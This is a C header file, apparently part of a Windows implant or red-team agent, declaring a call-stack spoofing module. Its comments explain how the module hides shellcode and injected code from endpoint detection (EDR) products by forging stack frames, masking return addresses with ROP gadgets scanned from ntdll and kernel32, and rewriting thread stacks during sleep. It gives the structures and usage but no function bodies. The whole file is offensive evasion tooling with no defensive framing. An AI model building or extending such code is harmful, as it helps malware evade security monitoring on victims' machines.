/*
 * stack_spoof.h — Call stack spoofing for API calls.
 *
 * EDRs inspect call stacks on sensitive API calls (NtAllocateVirtualMemory,
 * NtCreateThreadEx, etc.) to detect calls originating from non-image-backed
 * memory (shellcode, BOFs, injected code). If the return address points to
 * VirtualAlloc'd memory instead of a legitimate DLL, the call is flagged.
 *
 * This module provides two spoofing approaches:
 *
 * 1. SYNTHETIC FRAMES: Before making a sensitive call, we build fake stack
 *    frames that make it look like the call chain is:
 *      ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → our code
 *    This matches what a normal thread's stack looks like.
 *
 * 2. RETURN ADDRESS MASKING: We replace the return address on the stack
 *    with a `jmp [rax]` or `ret` gadget inside ntdll/kernel32, then restore
 *    after the call returns. Simpler but less robust.
 *
 * Implementation uses ROP gadgets found in ntdll/kernel32 at init time.
 */
#ifndef STACK_SPOOF_H
#define STACK_SPOOF_H

#include <windows.h>

/* ─── Stack frame context (saved/restored around calls) ─── */
typedef struct _SPOOF_CONTEXT {
    void   *originalRetAddr;    /* Saved return address */
    void   *gadgetAddr;         /* ROP gadget used for spoofing */
    void   *framePointer;       /* Saved RBP */
    BOOL    active;
} SPOOF_CONTEXT;

/*
 * Initialize the stack spoofing subsystem.
 * Scans ntdll and kernel32 for usable ROP gadgets:
 *   - `ret` gadgets (single-byte C3)
 *   - `jmp rax` gadgets (FF E0)
 *   - Legitimate frame pointers (BaseThreadInitThunk, RtlUserThreadStart)
 *
 * Must be called after ntdll unhooking (or at least after ntdll is loaded).
 */
BOOL spoof_init(void);

/*
 * Spoof the call stack before a sensitive API call.
 * Replaces the return address on the current stack frame with a
 * gadget address inside ntdll/kernel32.
 *
 * Usage:
 *   SPOOF_CONTEXT ctx;
 *   spoof_begin(&ctx);
 *   NtAllocateVirtualMemory(...);
 *   spoof_end(&ctx);
 *
 * IMPORTANT: spoof_begin/spoof_end must be in the SAME function
 * and at the SAME stack depth. Do not call across function boundaries.
 */
void spoof_begin(SPOOF_CONTEXT *ctx);
void spoof_end(SPOOF_CONTEXT *ctx);

/*
 * Thread stack spoofing during sleep.
 * Walks the current thread's stack and replaces return addresses
 * that point into agent memory with addresses inside ntdll/kernel32.
 * Restores them after sleep.
 *
 * savedCtx: receives opaque state for restoration.
 * Returns TRUE if spoofing was applied.
 */
BOOL spoof_thread_stack(void **savedCtx);
void spoof_restore_thread_stack(void *savedCtx);

/* ─── Gadget cache (populated by spoof_init) ─── */
typedef struct _GADGET_CACHE {
    void *retGadget;                /* Address of a `ret` (C3) in ntdll */
    void *jmpRaxGadget;             /* Address of `jmp rax` (FF E0) in ntdll */
    void *baseThreadInitThunk;      /* kernel32!BaseThreadInitThunk */
    void *rtlUserThreadStart;       /* ntdll!RtlUserThreadStart */
    void *ntdllBase;
    DWORD ntdllSize;
    void *kernel32Base;
    DWORD kernel32Size;
    BOOL  initialized;
} GADGET_CACHE;

extern GADGET_CACHE g_GadgetCache;

#endif /* STACK_SPOOF_H */
